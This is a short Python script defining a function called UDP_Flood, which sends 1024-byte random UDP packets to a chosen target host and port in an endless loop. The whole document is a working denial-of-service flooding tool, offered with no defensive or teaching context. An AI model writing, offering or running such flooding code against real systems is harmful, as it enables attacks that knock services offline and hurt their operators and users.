import socket
import random

def UDP_Flood(target, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    while 1:
        client.sendto(payload, (target, port))
